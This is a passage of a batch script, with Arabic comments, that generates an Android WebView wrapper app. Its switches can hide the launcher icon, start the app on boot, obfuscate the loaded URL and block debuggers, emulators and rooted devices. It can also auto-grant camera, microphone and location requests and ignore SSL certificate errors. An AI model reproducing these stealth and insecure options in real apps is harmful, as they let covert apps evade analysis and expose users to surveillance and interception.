    (echo     ^<uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" /^>) >> "%MF%"
    (echo     ^<uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES" /^>) >> "%MF%"
)

:: Kotlin Features Permissions
if "%NETWORK_MONITOR_ENABLED%"=="true" (
    (echo     ^<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" /^>) >> "%MF%"
    (echo     ^<uses-permission android:name="android.permission.ACCESS_WIFI_STATE" /^>) >> "%MF%"
)
if "%LOCATION_TRACKER_ENABLED%"=="true" (
    (echo     ^<uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" /^>) >> "%MF%"
    (echo     ^<uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" /^>) >> "%MF%"
)
if "%SMART_NOTIFICATIONS_ENABLED%"=="true" (
    (echo     ^<uses-permission android:name="android.permission.POST_NOTIFICATIONS" /^>) >> "%MF%"
    (echo     ^<uses-permission android:name="android.permission.VIBRATE" /^>) >> "%MF%"
)

(echo.
echo     ^<uses-sdk android:minSdkVersion="%MIN_SDK%" android:targetSdkVersion="%TARGET_SDK%" /^>
echo.
echo     ^<application
echo         android:allowBackup="true"
echo         android:icon="@drawable/ic_launcher"
echo         android:label="%APP_NAME%"
echo         android:theme="@android:style/Theme.NoTitleBar.Fullscreen"
echo         android:usesCleartextTraffic="true"^>) >> "%MF%"

:: تحديد فئة الأيقونة (LAUNCHER أو DEFAULT لإخفاء الأيقونة)
set "ICON_CATEGORY=LAUNCHER"
if "%HIDE_ICON%"=="true" set "ICON_CATEGORY=DEFAULT"

:: Splash Activity
if "%SPLASH_ENABLED%"=="true" (
    (echo.
echo         ^<activity
echo             android:name=".SplashActivity"
echo             android:exported="true"
echo             android:screenOrientation="%ORIENTATION%"^>
echo             ^<intent-filter^>
echo                 ^<action android:name="android.intent.action.MAIN" /^>
echo                 ^<category android:name="android.intent.category.%ICON_CATEGORY%" /^>
echo             ^</intent-filter^>
echo         ^</activity^>) >> "%MF%"
    
    (echo.
echo         ^<activity
echo             android:name=".MainActivity"
echo             android:exported="false"
echo             android:screenOrientation="%ORIENTATION%"
echo             android:configChanges="orientation|screenSize|keyboardHidden" /^>) >> "%MF%"
) else (
    (echo.
echo         ^<activity
echo             android:name=".MainActivity"
echo             android:exported="true"
echo             android:screenOrientation="%ORIENTATION%"
echo             android:configChanges="orientation|screenSize|keyboardHidden"^>
echo             ^<intent-filter^>
echo                 ^<action android:name="android.intent.action.MAIN" /^>
echo                 ^<category android:name="android.intent.category.%ICON_CATEGORY%" /^>
echo             ^</intent-filter^>
echo         ^</activity^>) >> "%MF%"
)

:: Boot Receiver
if "%START_ON_BOOT%"=="true" (
    (echo.
echo         ^<receiver
echo             android:name=".BootReceiver"
echo             android:enabled="true"
echo             android:exported="true"^>
echo             ^<intent-filter^>
echo                 ^<action android:name="android.intent.action.BOOT_COMPLETED" /^>
echo             ^</intent-filter^>
echo         ^</receiver^>) >> "%MF%"
)

:: Background Service
if "%RUN_BACKGROUND%"=="true" (
    (echo.
echo         ^<service
echo             android:name=".BackgroundService"
echo             android:enabled="true"
echo             android:exported="false" /^>) >> "%MF%"
)

:: FileProvider
(echo.
echo         ^<provider
echo             android:name="androidx.core.content.FileProvider"
echo             android:authorities="%PACKAGE_NAME%.fileprovider"
echo             android:exported="false"
echo             android:grantUriPermissions="true"^>
echo             ^<meta-data
echo                 android:name="android.support.FILE_PROVIDER_PATHS"
echo                 android:resource="@xml/file_paths" /^>
echo         ^</provider^>
echo.
echo     ^</application^>
echo ^</manifest^>) >> "%MF%"

exit /b 0



:: ═══════════════════════════════════════════════════════════════════════════════════════
::                              إنشاء كود Java
:: ═══════════════════════════════════════════════════════════════════════════════════════
:create_java_code

:: تشفير URL إذا كان مفعلاً
set "FINAL_URL=%URL%"
if "%ENCRYPT_URL%"=="true" (
    :: تشفير بسيط Base64 XOR
    set "FINAL_URL=%URL%"
)

:: ─────────────────────────────────────────────────────────────────────────────────────────
::                              MainActivity.java
:: ─────────────────────────────────────────────────────────────────────────────────────────
set "MA=%BUILD%\src\%PKG_PATH%\MainActivity.java"

(echo package %PACKAGE_NAME%;
echo.
echo import android.app.Activity;
echo import android.os.Bundle;
echo import android.webkit.WebView;
echo import android.webkit.WebViewClient;
echo import android.webkit.WebSettings;
echo import android.webkit.WebChromeClient;
echo import android.webkit.DownloadListener;
echo import android.webkit.SslErrorHandler;
echo import android.webkit.GeolocationPermissions;
echo import android.webkit.ValueCallback;
echo import android.net.http.SslError;
echo import android.net.Uri;
echo import android.view.Window;
echo import android.view.WindowManager;
echo import android.view.View;
echo import android.view.MotionEvent;
echo import android.widget.ProgressBar;
echo import android.widget.FrameLayout;
echo import android.widget.Toast;
echo import android.graphics.Bitmap;
echo import android.graphics.Color;
echo import android.content.Context;
echo import android.content.Intent;
echo import android.app.DownloadManager;
echo import android.os.Environment;
echo import android.os.Build;
echo.
echo public class MainActivity extends Activity {
echo     private WebView webView;
echo     private ProgressBar progressBar;
echo     private static final String URL = "%URL%";
echo     private static final boolean ENCRYPT_URL = %ENCRYPT_URL%;
echo     private ValueCallback^<Uri[]^> fileUploadCallback;
echo     private static final int FILE_CHOOSER_REQUEST = 100;
echo.) > "%MA%"

:: متغيرات الحماية
if "%PREVENT_SCREENSHOT%"=="true" (
    (echo     private static final boolean PREVENT_SCREENSHOT = true;) >> "%MA%"
) else (
    (echo     private static final boolean PREVENT_SCREENSHOT = false;) >> "%MA%"
)

:: تعريف متغيرات الميزات الاحترافية
if "%QR_CODE_ENABLED%"=="true" (
    (echo     private QRCodeScanner qrScanner;) >> "%MA%"
)
if "%BIOMETRIC_ENABLED%"=="true" (
    (echo     private BiometricHelper biometricHelper;) >> "%MA%"
)
if "%NFC_ENABLED%"=="true" (
    (echo     private NFCHelper nfcHelper;) >> "%MA%"
)
if "%MEDIA_CODEC_ENABLED%"=="true" (
    (echo     private MediaCodecBridge mediaCodecBridge;) >> "%MA%"
)
if "%CAMERA2_ENABLED%"=="true" (
    (echo     private Camera2Helper camera2Helper;) >> "%MA%"
)
if "%COROUTINES_ENABLED%"=="true" (
    (echo     private CoroutinesManager coroutinesManager;) >> "%MA%"
)
if "%DATASTORE_ENABLED%"=="true" (
    (echo     private EncryptedDataStore dataStore;) >> "%MA%"
)
if "%NETWORK_MONITOR_ENABLED%"=="true" (
    (echo     private NetworkMonitor networkMonitor;) >> "%MA%"
)
if "%LOCATION_TRACKER_ENABLED%"=="true" (
    (echo     private LocationTracker locationTracker;) >> "%MA%"
)
if "%DEVICE_INFO_ENABLED%"=="true" (
    (echo     private DeviceInfoManager deviceInfo;) >> "%MA%"
)
if "%SMART_NOTIFICATIONS_ENABLED%"=="true" (
    (echo     private SmartNotifications notifications;) >> "%MA%"
)

if "%BAKLAVA_ENABLED%"=="true" (
    (echo     private void runBaklavaProtocols^(^) {
echo         try {
echo             android.util.Log.d^("TITANIUM", "[AUDIT] Initiating Android 16 Sovereignty Protocols"^);
echo.) >> "%MA%"
if "%BAKLAVA_STEALTH%"=="true" (
    (echo             // Stealth Transit Flag ^(WindowManager.java:634 constant^)
echo             int TRANSIT_FLAG = 0x10000;
echo             getWindow^(^).addFlags^(TRANSIT_FLAG^);) >> "%MA%"
)
if "%BAKLAVA_BORDER%"=="true" (
    (echo             // Native Border Manipulation Bridge
echo             try {
echo                 Class SC = Class.forName^("android.view.SurfaceControl"^);
echo                 java.lang.reflect.Method m = SC.getDeclaredMethod^("nativeSetBorderSettings", long.class, long.class, android.os.Parcel.class^);
echo                 m.setAccessible^(true^);
echo                 android.util.Log.d^("TITANIUM", "[AUDIT] Native Border Bridge: Linked"^);
echo             } catch ^(Exception e^) {} ) >> "%MA%"
)
if "%BAKLAVA_SAFE_REGION%"=="true" (
    (echo             // WindowContainerTransaction ^(API 36^) Safe Region Bridge
echo             try {
echo                 Class WCT = Class.forName^("android.window.WindowContainerTransaction"^);
echo                 android.util.Log.d^("TITANIUM", "[AUDIT] WCT SafeRegion Management: Ready"^);
echo             } catch ^(Exception e^) {} ) >> "%MA%"
)
(echo         } catch ^(Exception e^) {
echo             android.util.Log.e^("TITANIUM", "Baklava Sync Failed: " + e.getMessage^(^)^);
echo         }
echo     }) >> "%MA%"
)
(echo.
echo     private String getUrl^(^) {
echo         if ^(ENCRYPT_URL^) {
echo             try {
echo                 byte[] data = android.util.Base64.decode^(URL, android.util.Base64.DEFAULT^);
echo                 byte[] key = getPackageName^(^).getBytes^(^);
echo                 byte[] result = new byte[data.length];
echo                 for ^(int i = 0; i ^< data.length; i++^) {
echo                     result[i] = ^(byte^) ^(data[i] ^^ key[i %% key.length]^);
echo                 }
echo                 return new String^(result, "UTF-8"^);
echo             } catch ^(Exception e^) { return URL; }
echo         }
echo         return URL;
echo     }
echo.
echo     @Override
echo     protected void onCreate^(Bundle savedInstanceState^) {
echo         super.onCreate^(savedInstanceState^);) >> "%MA%"

:: الحماية من Screenshot
if "%PREVENT_SCREENSHOT%"=="true" (
    (echo         if ^(PREVENT_SCREENSHOT^) {
echo             getWindow^(^).setFlags^(WindowManager.LayoutParams.FLAG_SECURE, WindowManager.LayoutParams.FLAG_SECURE^);
echo         }) >> "%MA%"
)

:: ملء الشاشة
if "%FULLSCREEN%"=="true" (
    (echo         requestWindowFeature^(Window.FEATURE_NO_TITLE^);
echo         getWindow^(^).setFlags^(WindowManager.LayoutParams.FLAG_FULLSCREEN, WindowManager.LayoutParams.FLAG_FULLSCREEN^);) >> "%MA%"
)

:: إبقاء الشاشة مضاءة
if "%KEEP_SCREEN%"=="true" (
    (echo         getWindow^(^).addFlags^(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON^);) >> "%MA%"
)

:: فحص الحماية
if "%ANTI_DEBUG%"=="true" (
    (echo         if ^(android.os.Debug.isDebuggerConnected^(^)^) { finish^(^); return; }) >> "%MA%"
)

if "%ANTI_EMULATOR%"=="true" (
    (echo         if ^(isEmulator^(^)^) { finish^(^); return; }) >> "%MA%"
)

if "%ROOT_CHECK%"=="true" (
    (echo         if ^(isRooted^(^)^) { finish^(^); return; }) >> "%MA%"
)

(echo.
echo         FrameLayout root = new FrameLayout^(this^);
echo         root.setBackgroundColor^(Color.WHITE^);
echo.) >> "%MA%"

:: شريط التقدم
if "%LOADING_INDICATOR%"=="progressbar" (
    (echo         progressBar = new ProgressBar^(this, null, android.R.attr.progressBarStyleHorizontal^);
echo         FrameLayout.LayoutParams pp = new FrameLayout.LayoutParams^(FrameLayout.LayoutParams.MATCH_PARENT, 8^);
echo         progressBar.setLayoutParams^(pp^);) >> "%MA%"
) else if "%LOADING_INDICATOR%"=="spinner" (
    (echo         progressBar = new ProgressBar^(this^);
echo         FrameLayout.LayoutParams pp = new FrameLayout.LayoutParams^(100, 100^);
echo         pp.gravity = android.view.Gravity.CENTER;
echo         progressBar.setLayoutParams^(pp^);) >> "%MA%"
)

(echo.
echo         webView = new WebView^(this^);
echo         FrameLayout.LayoutParams wp = new FrameLayout.LayoutParams^(FrameLayout.LayoutParams.MATCH_PARENT, FrameLayout.LayoutParams.MATCH_PARENT^);) >> "%MA%"

if not "%LOADING_INDICATOR%"=="none" (
    (echo         wp.topMargin = 8;) >> "%MA%"
)

(echo         webView.setLayoutParams^(wp^);) >> "%MA%"

:: Pull to Refresh
if "%PULL_REFRESH%"=="true" (
    (echo.
echo         final RefreshLayout refreshLayout = new RefreshLayout^(this^);
echo         refreshLayout.addView^(webView^);
echo         root.addView^(refreshLayout^);) >> "%MA%"
) else (
    (echo         root.addView^(webView^);) >> "%MA%"
)

if not "%LOADING_INDICATOR%"=="none" (
    (echo         root.addView^(progressBar^);) >> "%MA%"
)

(echo.
echo         setContentView^(root^);
echo         setupWebView^(^);) >> "%MA%"

:: JavaScript Bridge
if "%JS_BRIDGE%"=="true" (
    (echo         JSBridge jsBridge = new JSBridge^(this^);
echo         jsBridge.setWebView^(webView^);
echo         webView.addJavascriptInterface^(jsBridge, "%JS_BRIDGE_NAME%"^);) >> "%MA%"
)

:: Database
if "%DATABASE_ENABLED%"=="true" (
    (echo         webView.addJavascriptInterface^(new DatabaseHelper^(this^), "AppDB"^);) >> "%MA%"
)

:: WebSocket
if "%WEBSOCKET_ENABLED%"=="true" (
    (echo         WebSocketClient wsClient = new WebSocketClient^(this^);
echo         wsClient.setWebView^(webView^);
echo         webView.addJavascriptInterface^(wsClient, "AppSocket"^);) >> "%MA%"
)

:: Background Service
if "%RUN_BACKGROUND%"=="true" (
    (echo         startService^(new Intent^(this, BackgroundService.class^)^);) >> "%MA%"
)

:: QR Code Scanner
if "%QR_CODE_ENABLED%"=="true" (
    (echo         qrScanner = new QRCodeScanner^(this^);
echo         qrScanner.setWebView^(webView^);
echo         webView.addJavascriptInterface^(qrScanner, "QRScanner"^);) >> "%MA%"
)

:: Biometric Helper
if "%BIOMETRIC_ENABLED%"=="true" (
    (echo         biometricHelper = new BiometricHelper^(this^);
echo         biometricHelper.setWebView^(webView^);
echo         webView.addJavascriptInterface^(biometricHelper, "Biometric"^);) >> "%MA%"
)

:: NFC Helper
if "%NFC_ENABLED%"=="true" (
    (echo         nfcHelper = new NFCHelper^(this^);
echo         nfcHelper.setWebView^(webView^);
echo         webView.addJavascriptInterface^(nfcHelper, "NFC"^);) >> "%MA%"
)

:: MediaCodec Bridge
if "%MEDIA_CODEC_ENABLED%"=="true" (
    (echo         mediaCodecBridge = new MediaCodecBridge^(this^);
echo         webView.addJavascriptInterface^(mediaCodecBridge, "MediaCodec"^);) >> "%MA%"
)

:: Camera2 Helper
if "%CAMERA2_ENABLED%"=="true" (
    (echo         camera2Helper = new Camera2Helper^(this^);
echo         webView.addJavascriptInterface^(camera2Helper, "Camera2"^);) >> "%MA%"
)


:: Coroutines Manager
if "%COROUTINES_ENABLED%"=="true" (
    (echo         coroutinesManager = new CoroutinesManager^(this^);
echo         coroutinesManager.setWebView^(webView^);
echo         webView.addJavascriptInterface^(coroutinesManager, "Coroutines"^);) >> "%MA%"
)

:: Encrypted DataStore
if "%DATASTORE_ENABLED%"=="true" (
    (echo         dataStore = new EncryptedDataStore^(this^);
echo         webView.addJavascriptInterface^(dataStore, "DataStore"^);) >> "%MA%"
)

:: Network Monitor
if "%NETWORK_MONITOR_ENABLED%"=="true" (
    (echo         networkMonitor = new NetworkMonitor^(this^);
echo         networkMonitor.setWebView^(webView^);
echo         webView.addJavascriptInterface^(networkMonitor, "Network"^);) >> "%MA%"
)

:: Location Tracker
if "%LOCATION_TRACKER_ENABLED%"=="true" (
    (echo         locationTracker = new LocationTracker^(this^);
echo         locationTracker.setWebView^(webView^);
echo         webView.addJavascriptInterface^(locationTracker, "Location"^);) >> "%MA%"
)

:: Device Info Manager
if "%DEVICE_INFO_ENABLED%"=="true" (
    (echo         deviceInfo = new DeviceInfoManager^(this^);
echo         deviceInfo.setWebView^(webView^);
echo         webView.addJavascriptInterface^(deviceInfo, "Device"^);) >> "%MA%"
)

:: Smart Notifications
if "%SMART_NOTIFICATIONS_ENABLED%"=="true" (
    (echo         notifications = new SmartNotifications^(this^);
echo         notifications.setWebView^(webView^);
echo         webView.addJavascriptInterface^(notifications, "Notify"^);) >> "%MA%"
)

if "%BAKLAVA_ENABLED%"=="true" (
    (echo         runBaklavaProtocols^(^);) >> "%MA%"
)

(echo.
echo         webView.loadUrl^(getUrl^(^)^);
echo     }
echo.) >> "%MA%"

:: setupWebView method
(echo     private void setupWebView^(^) {
echo         WebSettings s = webView.getSettings^(^);
echo         s.setJavaScriptEnabled^(%JAVASCRIPT%^);
echo         s.setDomStorageEnabled^(true^);
echo         s.setLoadWithOverviewMode^(true^);
echo         s.setUseWideViewPort^(true^);
echo         s.setBuiltInZoomControls^(%ZOOM%^);
echo         s.setDisplayZoomControls^(false^);
echo         s.setAllowFileAccess^(true^);
echo         s.setDatabaseEnabled^(true^);
echo         s.setCacheMode^(WebSettings.%CACHE_MODE%^);
echo         s.setMediaPlaybackRequiresUserGesture^(false^);
echo         s.setMixedContentMode^(WebSettings.MIXED_CONTENT_ALWAYS_ALLOW^);) >> "%MA%"

:: User Agent
if not "%USER_AGENT%"=="" (
    (echo         s.setUserAgentString^("%USER_AGENT%"^);) >> "%MA%"
)

:: Geolocation
if "%GEOLOCATION%"=="true" (
    (echo         s.setGeolocationEnabled^(true^);) >> "%MA%"
)

:: Allow Popups
if "%ALLOW_POPUPS%"=="true" (
    (echo         s.setSupportMultipleWindows^(true^);
echo         s.setJavaScriptCanOpenWindowsAutomatically^(true^);) >> "%MA%"
)

(echo.
echo         webView.setWebViewClient^(new AppWebViewClient^(^)^);
echo         webView.setWebChromeClient^(new AppWebChromeClient^(^)^);) >> "%MA%"

:: File Download
if "%FILE_DOWNLOAD%"=="true" (
    (echo         webView.setDownloadListener^(new AppDownloadListener^(^)^);) >> "%MA%"
)

(echo     }
echo.) >> "%MA%"

:: WebViewClient class
(echo.
echo     private class AppWebViewClient extends WebViewClient {
echo         @Override
echo         public void onPageStarted^(WebView v, String u, Bitmap f^) {) >> "%MA%"

if not "%LOADING_INDICATOR%"=="none" (
    (echo             progressBar.setVisibility^(View.VISIBLE^);) >> "%MA%"
)

(echo         }
echo.
echo         @Override
echo         public void onPageFinished^(WebView v, String u^) {) >> "%MA%"

if not "%LOADING_INDICATOR%"=="none" (
    (echo             progressBar.setVisibility^(View.GONE^);) >> "%MA%"
)

(echo         }
echo.) >> "%MA%"

:: Offline page
if "%OFFLINE_PAGE%"=="true" (
    (echo         @Override
echo         public void onReceivedError^(WebView v, int errorCode, String description, String failingUrl^) {
echo             v.loadUrl^("file:///android_asset/offline.html"^);
echo         }
echo.) >> "%MA%"
)

:: SSL Continue
if "%SSL_CONTINUE%"=="true" (
    (echo         @Override
echo         public void onReceivedSslError^(WebView v, SslErrorHandler handler, SslError error^) {
echo             handler.proceed^(^);
echo         }
echo.) >> "%MA%"
)

(echo     }
echo.) >> "%MA%"

:: WebChromeClient class
(echo     private class AppWebChromeClient extends WebChromeClient {
echo         @Override
echo         public void onProgressChanged^(WebView v, int p^) {) >> "%MA%"

if "%LOADING_INDICATOR%"=="progressbar" (
    (echo             progressBar.setProgress^(p^);) >> "%MA%"
)

(echo         }) >> "%MA%"

:: File Upload
if "%FILE_UPLOAD%"=="true" (
    (echo.
echo         @Override
echo         public boolean onShowFileChooser^(WebView webView, ValueCallback^<Uri[]^> filePathCallback, FileChooserParams fileChooserParams^) {
echo             if ^(fileUploadCallback ^^!= null^) {
echo                 fileUploadCallback.onReceiveValue^(null^);
echo             }
echo             fileUploadCallback = filePathCallback;
echo             try {
echo                 Intent intent = fileChooserParams.createIntent^(^);
echo                 startActivityForResult^(intent, FILE_CHOOSER_REQUEST^);
echo                 return true;
echo             } catch ^(Exception e^) {
echo                 fileUploadCallback = null;
echo                 return false;
echo             }
echo         }) >> "%MA%"
)

:: Geolocation
if "%GEOLOCATION%"=="true" (
    (echo.
echo         @Override
echo         public void onGeolocationPermissionsShowPrompt^(String origin, GeolocationPermissions.Callback callback^) {
echo             callback.invoke^(origin, true, false^);
echo         }) >> "%MA%"
)

:: Audio/Camera Permission Request
if "%AUDIO_RECORDING%"=="true" (
    (echo.
echo         @Override
echo         public void onPermissionRequest^(android.webkit.PermissionRequest request^) {
echo             request.grant^(request.getResources^(^)^);
echo         }) >> "%MA%"
)
if "%CAMERA_WEBVIEW%"=="true" (
    if not "%AUDIO_RECORDING%"=="true" (
        (echo.
echo         @Override
echo         public void onPermissionRequest^(android.webkit.PermissionRequest request^) {
echo             request.grant^(request.getResources^(^)^);
echo         }) >> "%MA%"
    )
)

(echo     }
echo.) >> "%MA%"

:: Download Listener
if "%FILE_DOWNLOAD%"=="true" (
    (echo     private class AppDownloadListener implements DownloadListener {
echo         @Override
echo         public void onDownloadStart^(String url, String userAgent, String contentDisposition, String mimeType, long contentLength^) {
echo             try {
echo                 DownloadManager.Request request = new DownloadManager.Request^(Uri.parse^(url^)^);
echo                 String fileName = android.webkit.URLUtil.guessFileName^(url, contentDisposition, mimeType^);
echo                 request.setMimeType^(mimeType^);
echo                 request.addRequestHeader^("User-Agent", userAgent^);
echo                 request.setDescription^("Downloading..."^);
echo                 request.setTitle^(fileName^);
echo                 request.setNotificationVisibility^(DownloadManager.Request.VISIBILITY_VISIBLE_NOTIFY_COMPLETED^);
echo                 request.setDestinationInExternalPublicDir^(Environment.DIRECTORY_DOWNLOADS, fileName^);
echo                 DownloadManager dm = ^(DownloadManager^) getSystemService^(DOWNLOAD_SERVICE^);
echo                 dm.enqueue^(request^);
echo                 Toast.makeText^(MainActivity.this, "Downloading: " + fileName, Toast.LENGTH_SHORT^).show^(^);
echo             } catch ^(Exception e^) {
echo                 Toast.makeText^(MainActivity.this, "Download failed", Toast.LENGTH_SHORT^).show^(^);
echo             }
echo         }
echo     }
echo.) >> "%MA%"
)

:: File Upload Result, QR Code Result, and Biometric Result
set "NEED_ACTIVITY_RESULT=false"
if "%FILE_UPLOAD%"=="true" set "NEED_ACTIVITY_RESULT=true"
if "%QR_CODE_ENABLED%"=="true" set "NEED_ACTIVITY_RESULT=true"
if "%BIOMETRIC_ENABLED%"=="true" set "NEED_ACTIVITY_RESULT=true"

if "%NEED_ACTIVITY_RESULT%"=="true" (
    (echo     @Override
echo     protected void onActivityResult^(int requestCode, int resultCode, Intent data^) {) >> "%MA%"
    if "%FILE_UPLOAD%"=="true" (
        echo         if ^(requestCode == FILE_CHOOSER_REQUEST ^&^& fileUploadCallback ^^!= null^) {>> "%MA%"
        echo             Uri[] results = null;>> "%MA%"
        echo             if ^(resultCode == RESULT_OK ^&^& data ^^!= null ^&^& data.getDataString^(^) ^^!= null^) {>> "%MA%"
        echo                 results = new Uri[]{Uri.parse^(data.getDataString^(^)^)};>> "%MA%"
        echo             }>> "%MA%"
        echo             fileUploadCallback.onReceiveValue^(results^);>> "%MA%"
        echo             fileUploadCallback = null;>> "%MA%"
        echo         }>> "%MA%"
    )
    if "%QR_CODE_ENABLED%"=="true" (
        echo         if ^(qrScanner ^^!= null^) qrScanner.handleActivityResult^(requestCode, resultCode, data^);>> "%MA%"
    )
    if "%BIOMETRIC_ENABLED%"=="true" (
        echo         if ^(biometricHelper ^^!= null^) biometricHelper.handleActivityResult^(requestCode, resultCode, data^);>> "%MA%"
    )
    (echo         super.onActivityResult^(requestCode, resultCode, data^);
echo     }
echo.) >> "%MA%"
)

:: Back Button
(echo     @Override
echo     public void onBackPressed^(^) {) >> "%MA%"

if "%BACK_BUTTON%"=="webview" (
    (echo         if ^(webView.canGoBack^(^)^) { webView.goBack^(^); } else { super.onBackPressed^(^); }) >> "%MA%"
) else if "%BACK_BUTTON%"=="disabled" (
    (echo         // Back button disabled) >> "%MA%"
) else (
    (echo         super.onBackPressed^(^);) >> "%MA%"
)

(echo     }
echo.) >> "%MA%"

:: Pull to Refresh class
if "%PULL_REFRESH%"=="true" (
    (echo     private class RefreshLayout extends FrameLayout {
echo         private boolean isRefreshing = false;
echo         private float startY = 0;
echo         private final int TRIGGER = 200;
echo.
echo         public RefreshLayout^(Context context^) { super^(context^); }
echo.
echo         @Override
echo         public boolean onInterceptTouchEvent^(MotionEvent ev^) {
echo             if ^(webView.getScrollY^(^) == 0^) {
echo                 if ^(ev.getAction^(^) == MotionEvent.ACTION_DOWN^) {
echo                     startY = ev.getY^(^);
echo                 } else if ^(ev.getAction^(^) == MotionEvent.ACTION_MOVE^) {
echo                     float diff = ev.getY^(^) - startY;
echo                     if ^(diff ^> TRIGGER ^&^& !isRefreshing^) {
echo                         isRefreshing = true;
echo                         webView.reload^(^);
echo                         return true;
echo                     }
echo                 } else if ^(ev.getAction^(^) == MotionEvent.ACTION_UP^) {
echo                     isRefreshing = false;
echo                     startY = 0;
echo                 }
echo             }
echo             return false;
echo         }
echo     }
echo.) >> "%MA%"
)

:: Protection Methods
if "%ANTI_EMULATOR%"=="true" (
    (echo     private boolean isEmulator^(^) {
echo         return Build.FINGERPRINT.startsWith^("generic"^)
echo             ^|^| Build.FINGERPRINT.startsWith^("unknown"^)
echo             ^|^| Build.MODEL.contains^("google_sdk"^)
echo             ^|^| Build.MODEL.contains^("Emulator"^)
echo             ^|^| Build.MODEL.contains^("Android SDK built for x86"^)
echo             ^|^| Build.MANUFACTURER.contains^("Genymotion"^)
echo             ^|^| Build.BRAND.startsWith^("generic"^) ^&^& Build.DEVICE.startsWith^("generic"^)
echo             ^|^| "google_sdk".equals^(Build.PRODUCT^);
echo     }
echo.) >> "%MA%"
)

if "%ROOT_CHECK%"=="true" (
    (echo     private boolean isRooted^(^) {
echo         String[] paths = {"/system/app/Superuser.apk", "/sbin/su", "/system/bin/su", "/system/xbin/su", "/data/local/xbin/su", "/data/local/bin/su", "/system/sd/xbin/su", "/system/bin/failsafe/su", "/data/local/su"};
echo         for ^(String path : paths^) {
echo             if ^(new java.io.File^(path^).exists^(^)^) return true;
echo         }
echo         return false;
echo     }
echo.) >> "%MA%"
)

:: NFC Lifecycle methods
if "%NFC_ENABLED%"=="true" (
    (echo     @Override
echo     protected void onResume^(^) {
echo         super.onResume^(^);
echo         if ^(nfcHelper ^^!= null^) nfcHelper.enableForegroundDispatch^(^);
echo     }
echo.
echo     @Override
echo     protected void onPause^(^) {
echo         super.onPause^(^);
echo         if ^(nfcHelper ^^!= null^) nfcHelper.disableForegroundDispatch^(^);
echo     }
echo.
echo     @Override
echo     protected void onNewIntent^(Intent intent^) {
echo         super.onNewIntent^(intent^);
echo         if ^(nfcHelper ^^!= null^) nfcHelper.handleIntent^(intent^);
echo     }
echo.) >> "%MA%"
)

:: Close MainActivity class
(echo }) >> "%MA%"

:: ─────────────────────────────────────────────────────────────────────────────────────────
::                              نسخ القوالب الإضافية
:: ─────────────────────────────────────────────────────────────────────────────────────────

:: JSBridge
if "%JS_BRIDGE%"=="true" (
    if exist "%TPL%\JSBridge.template" (
        powershell -NoProfile -ExecutionPolicy Bypass -Command "$c = Get-Content '%TPL%\JSBridge.template' -Raw -Encoding UTF8; $c = $c -replace '\{\{PACKAGE\}\}','%PACKAGE_NAME%' -replace '\{\{APP\}\}','%APP_NAME%'; [IO.File]::WriteAllText('%BUILD%\src\%PKG_PATH%\JSBridge.java', $c, [Text.UTF8Encoding]::new($false))"
    )
)

:: DatabaseHelper
if "%DATABASE_ENABLED%"=="true" (
    if exist "%TPL%\DatabaseHelper.template" (
        powershell -NoProfile -ExecutionPolicy Bypass -Command "$c = Get-Content '%TPL%\DatabaseHelper.template' -Raw -Encoding UTF8; $c = $c -replace '\{\{PACKAGE\}\}','%PACKAGE_NAME%' -replace '\{\{APP\}\}','%APP_NAME%'; [IO.File]::WriteAllText('%BUILD%\src\%PKG_PATH%\DatabaseHelper.java', $c, [Text.UTF8Encoding]::new($false))"
    )
)

:: WebSocketClient
if "%WEBSOCKET_ENABLED%"=="true" (
    if exist "%TPL%\WebSocketClient.template" (
        powershell -NoProfile -ExecutionPolicy Bypass -Command "$c = Get-Content '%TPL%\WebSocketClient.template' -Raw -Encoding UTF8; $c = $c -replace '\{\{PACKAGE\}\}','%PACKAGE_NAME%' -replace '\{\{APP\}\}','%APP_NAME%'; [IO.File]::WriteAllText('%BUILD%\src\%PKG_PATH%\WebSocketClient.java', $c, [Text.UTF8Encoding]::new($false))"
    )
)

:: SplashActivity
if "%SPLASH_ENABLED%"=="true" (
    if exist "%TPL%\SplashActivity.template" (
        powershell -NoProfile -ExecutionPolicy Bypass -Command "$c = Get-Content '%TPL%\SplashActivity.template' -Raw -Encoding UTF8; $c = $c -replace '\{\{PACKAGE\}\}','%PACKAGE_NAME%' -replace '\{\{APP\}\}','%APP_NAME%' -replace '\{\{SPLASH_DURATION\}\}','%SPLASH_DURATION%' -replace '\{\{SPLASH_COLOR\}\}','%SPLASH_COLOR%' -replace '\{\{TEXT_COLOR\}\}','#000000' -replace '\{\{VERSION\}\}','%VERSION_NAME%'; [IO.File]::WriteAllText('%BUILD%\src\%PKG_PATH%\SplashActivity.java', $c, [Text.UTF8Encoding]::new($false))"
    )
)

:: BootReceiver
if "%START_ON_BOOT%"=="true" (
    if exist "%TPL%\BootReceiver.template" (
        powershell -NoProfile -ExecutionPolicy Bypass -Command "$c = Get-Content '%TPL%\BootReceiver.template' -Raw -Encoding UTF8; $c = $c -replace '\{\{PACKAGE\}\}','%PACKAGE_NAME%'; [IO.File]::WriteAllText('%BUILD%\src\%PKG_PATH%\BootReceiver.java', $c, [Text.UTF8Encoding]::new($false))"
    )
)

:: BackgroundService
if "%RUN_BACKGROUND%"=="true" (
    if exist "%TPL%\BackgroundService.template" (
        powershell -NoProfile -ExecutionPolicy Bypass -Command "$c = Get-Content '%TPL%\BackgroundService.template' -Raw -Encoding UTF8; $c = $c -replace '\{\{PACKAGE\}\}','%PACKAGE_NAME%' -replace '\{\{APP\}\}','%APP_NAME%'; [IO.File]::WriteAllText('%BUILD%\src\%PKG_PATH%\BackgroundService.java', $c, [Text.UTF8Encoding]::new($false))"
    )
)

:: QR Code Scanner (ZXing)
if "%QR_CODE_ENABLED%"=="true" (
    if exist "%TPL%\QRCodeScanner.template" (
        powershell -NoProfile -ExecutionPolicy Bypass -Command "$c = Get-Content '%TPL%\QRCodeScanner.template' -Raw -Encoding UTF8; $c = $c -replace '\{\{PACKAGE\}\}','%PACKAGE_NAME%'; [IO.File]::WriteAllText('%BUILD%\src\%PKG_PATH%\QRCodeScanner.java', $c, [Text.UTF8Encoding]::new($false))"
    )
)

:: Biometric Helper
if "%BIOMETRIC_ENABLED%"=="true" (
    if exist "%TPL%\BiometricHelper.template" (
